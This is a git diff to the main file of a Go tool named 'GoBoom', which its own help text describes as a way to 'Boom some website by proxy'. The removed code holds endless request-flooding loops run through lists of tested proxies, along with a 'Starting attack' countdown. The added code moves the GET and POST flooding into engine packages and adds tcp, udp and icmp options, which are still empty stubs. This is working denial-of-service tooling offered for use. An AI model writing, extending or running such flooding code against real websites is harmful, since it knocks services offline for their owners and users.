@@ -3,11 +3,11 @@ package main
 import (
 	"encoding/json"
 	"fmt"
+	"goBoom/engines"
+	"goBoom/lib"
 	"io/ioutil"
 	"log"
-	"net"
 	"net/http"
-	"net/url"
 	"os"
 	"runtime"
 	"strconv"
@@ -127,116 +127,12 @@ func getProxyList_file(path string) []string {
 	return strings.Split(proxy_list, "\n")
 }
 
-func stringInSlice(a string, list []string) bool {
-	for _, b := range list {
-		if b == a {
-			return true
-		}
-	}
-	return false
-}
-
-func handlerProxy(domain, proxy string) string {
-	//just connect to the website and check the status code
-	//use proxy to connect
-	//format of proxy is ip:port
-	//format of domain is domain.com
-	mutex := &sync.Mutex{}
-	mutex.Lock()
-	proxyUrl, err := url.Parse("http://" + proxy)
-	mutex.Unlock()
-	if err != nil {
-		return "error"
-	}
-	//create a new http client
-	client := &http.Client{
-		Transport: &http.Transport{
-			Proxy: http.ProxyURL(proxyUrl),
-		}}
-	//set http client like a mozilla browser
-	//client timeout after 1 second
-	client.Timeout = time.Millisecond * 1000
-	//connect to the website
-	mutex.Lock()
-	resp, err := client.Get("http://" + domain)
-	mutex.Unlock()
-	if err != nil {
-		return "error"
-	}
-	defer resp.Body.Close()
-	//if resp is 503 too many connection
-	// make [][]string statusCodeToEscape
-	if stringInSlice(resp.Status, statusCodeToEscape) {
-		return "error"
-	}
-	if resp.StatusCode != 0 {
-		//fmt.Println(resp.Status)
-		return resp.Status
-	} else {
-		return "error"
-	}
-}
-
-func handler(domain string) string {
-	//just connect to the website and check the status code
-	//format of domain is domain.com
-	//create a new http client
-	client := &http.Client{}
-	//set http client like a mozilla browser
-	client.Timeout = time.Millisecond * 100
-	//connect to the website
-	resp, err := client.Get("http://" + domain)
-	if err != nil {
-		return "error"
-	}
-	defer resp.Body.Close()
-	//if resp is 503 too many connection
-	// make [][]string statusCodeToEscape
-	if stringInSlice(resp.Status, statusCodeToEscape) {
-		return "error"
-	}
-	if resp.StatusCode != 0 {
-		//fmt.Println(resp.Status)
-		return resp.Status
-	} else {
-		return "error"
-	}
-}
-
-func removeDuplicates(elements []string) []string {
-	// Use map to record duplicates as we find them.
-	encountered := map[string]bool{}
-	result := []string{}
-
-	for v := range elements {
-		if encountered[elements[v]] == true {
-			// Do not add duplicate.
-		} else {
-			// Record this element as an encountered element.
-			encountered[elements[v]] = true
-			// Append to result slice.
-			result = append(result, elements[v])
-		}
-	}
-	// Return the new slice.
-	return result
-}
-
 func add_good_proxy(proxy string, good_proxy []string) []string {
 	var mutex = &sync.Mutex{}
 	mutex.Lock()
 	good_proxy = append(good_proxy, proxy)
 	mutex.Unlock()
 	return good_proxy
-}
-
-func check_host_up(domain string) bool {
-	//check if the host is up
-	_, err := net.LookupHost(domain)
-	if err != nil {
-		return false
-	}
-	return true
 }
 
 func test_proxy(proxy_file []string) []string {
@@ -255,16 +151,16 @@ func test_proxy(proxy_file []string) []string {
 	}
 
 	//remove duplicate
-	proxy_list = removeDuplicates(proxy_list)
+	proxy_list = lib.RemoveDuplicates(proxy_list)
 	fmt.Println("Total proxy : ", len(proxy_list))
-	domain := "github.com"
+	url := "https://1.1.1.1"
 	wg2 := sync.WaitGroup{}
 	fmt.Println("Checking proxy...")
 	for _, proxy := range proxy_list {
 		wg2.Add(1)
 		go func(proxy string) {
 			defer wg2.Done()
-			result := handlerProxy(domain, proxy)
+			result := engines.HandlerProxy(url, proxy)
 			//if more than 5 seconde, the proxy is not good
 			if result == "200 OK" || result == "200" {
 				good_proxy = add_good_proxy(proxy, good_proxy)
@@ -276,22 +172,14 @@ func test_proxy(proxy_file []string) []string {
 	return good_proxy
 }
 
-func remove_proxy(proxy string, proxy_list []string) []string {
-	var mutex = &sync.Mutex{}
-	for i, p := range proxy_list {
-		if p == proxy {
-			mutex.Lock()
-			proxy_list = append(proxy_list[:i], proxy_list[i+1:]...)
-			mutex.Unlock()
-			break
-		}
-	}
-	return proxy_list
-}
-
 func main() {
 	parser := argparse.NewParser("GoBoom", "Boom some website by proxy")
-	domain := parser.String("d", "domain", &argparse.Options{Required: true, Help: "Domain to boom"})
+	get := parser.String("", "get", &argparse.Options{Required: false, Help: "Url (get) to boom"})
+	post := parser.String("", "post", &argparse.Options{Required: false, Help: "Url (post) to boom"})
+	post_data := parser.String("", "post-data", &argparse.Options{Required: false, Help: "Path to file with data to send with post"})
+	tcp := parser.String("", "tcp", &argparse.Options{Required: false, Help: "Ip to boom with tcp"})
+	udp := parser.String("", "udp", &argparse.Options{Required: false, Help: "Ip to boom with udp"})
+	icmp := parser.String("", "icmp", &argparse.Options{Required: false, Help: "Ip to boom with icmp"})
 	threads := parser.String("t", "threads", &argparse.Options{Required: false, Help: "Number of core to use", Default: "max"})
 	proxy_file := parser.StringList("p", "proxy-file", &argparse.Options{Required: false, Help: "Proxy file(s), separate with a ',' each files. Format of file(s) must be ip:port", Default: []string{}})
 	proxy_mult := parser.Int("x", "proxy-mult", &argparse.Options{Required: false, Help: "You can multiply the working proxys detected with this option", Default: 12})
@@ -301,15 +189,10 @@ func main() {
 		fmt.Print(parser.Usage(err))
 		os.Exit(1)
 	}
-	if !check_host_up(*domain) {
-		fmt.Println("The domain or ip is not up")
-		os.Exit(1)
-	}
 
 	//set max GOMAXPROCS
 	//detect the number of cpu
 	cpu := runtime.NumCPU()
-
 	//if threads superior to cpu convert to cpu
 	if *threads == "max" {
 		runtime.GOMAXPROCS(cpu)
@@ -319,99 +202,41 @@ func main() {
 			fmt.Println("Error with threads")
 			os.Exit(1)
 		}
-		if threads_int > cpu {
+		if threads_int > cpu && *mode == 1 {
 			runtime.GOMAXPROCS(cpu)
 		} else {
 			runtime.GOMAXPROCS(threads_int)
 			cpu = threads_int
 		}
 	}
-	//select mode 1 or 2
+
+	good_proxy := []string{}
 	if *mode == 1 {
-		for _, p := range *proxy_file {
-			//split all the files by comma
-			if strings.Contains(p, ",") {
-				*proxy_file = strings.Split(p, ",")
-			} else {
-				*proxy_file = append(*proxy_file, p)
-			}
-		}
-		proxy_list := test_proxy(*proxy_file)
-		var proxy_list_temp []string
-		fmt.Println("Good proxy : ", len(proxy_list))
-		for i := 0; i < *proxy_mult; i++ {
-			proxy_list_temp = append(proxy_list_temp, proxy_list...)
-			//if last
-			if i == *proxy_mult-1 {
-				proxy_list = proxy_list_temp
-			}
-		}
-
 		//get the list of proxy
-		fmt.Println("Total proxy after multiplication :", len(proxy_list))
-		fmt.Println("Max process :", cpu)
-		fmt.Println("Starting attack in 5 seconds...")
-		time.Sleep(5 * time.Second)
-		//start the threads
-		//create a channel list of good proxy
-		//mutex := &sync.Mutex{}
-		var wg sync.WaitGroup
-		// mutex := &sync.Mutex{}
-		// var to_remove []string
-		// var to_keep []string
-		for {
-			// if to_remove != nil {
-			// 	for _, proxy := range to_remove {
-			// 		proxy_list = remove_proxy(proxy, proxy_list)
-			// 	}
-			// // }
-			// proxy_list = append(proxy_list, to_keep...)
-			// to_remove = nil
-			// to_keep = nil
-			for _, proxy := range proxy_list {
-				wg.Add(1)
-				go func(proxy string) {
-					status := handlerProxy(*domain, proxy)
-					fmt.Println(status + " : " + proxy + "	time :	" + time.Now().Format("15:04:05.000"))
-					//if status is error pop the proxy from the list
-					// if status == "error" {
-					// 	mutex.Lock()
-					// 	to_remove = append(to_remove, proxy)
-					// 	mutex.Unlock()
-					// } else {
-					// 	mutex.Lock()
-					// 	to_keep = append(to_keep, proxy)
-					// 	mutex.Unlock()
-					// }
-					wg.Done()
-				}(proxy)
-			}
-			wg.Wait()
-		}
-
-	} else if *mode == 2 {
-		//set max core to use to max
-		cpu := runtime.NumCPU()
-		runtime.GOMAXPROCS(cpu)
-		threads_int, err := strconv.Atoi(*threads)
-		if err != nil {
-			fmt.Println("Error : threads must be a number")
-			os.Exit(1)
-		}
-		for {
-			var wg sync.WaitGroup
-			for i := 0; i < threads_int; i++ {
-				wg.Add(1)
-				go func() {
-					//use func handler
-					status := handler(*domain)
-					fmt.Println(status, "time :", time.Now().Format("15:04:05.000"))
-					wg.Done()
-				}()
-			}
-			wg.Wait()
-			fmt.Println("All threads are dead, restarting")
+		good_proxy := test_proxy(*proxy_file)
+		fmt.Println("Good proxy : ", len(good_proxy))
+		fmt.Println("After multiply : ", len(good_proxy)*(*proxy_mult))
+		//multiply the good proxy
+		for i := 0; i < *proxy_mult; i++ {
+			good_proxy = append(good_proxy, good_proxy...)
 		}
 	}
 
+	if *get != "" {
+		state := engines.Get(*get, good_proxy, cpu)
+		if state != "" {
+			fmt.Println(state)
+		}
+	} else if *post != "" {
+		engines.Post(*post, good_proxy, cpu, *post_data)
+	} else if *tcp != "" {
+		os.Exit(1)
+	} else if *udp != "" {
+		os.Exit(1)
+	} else if *icmp != "" {
+		os.Exit(1)
+	} else {
+		fmt.Println(parser.Usage(err))
+		os.Exit(1)
+	}
 }
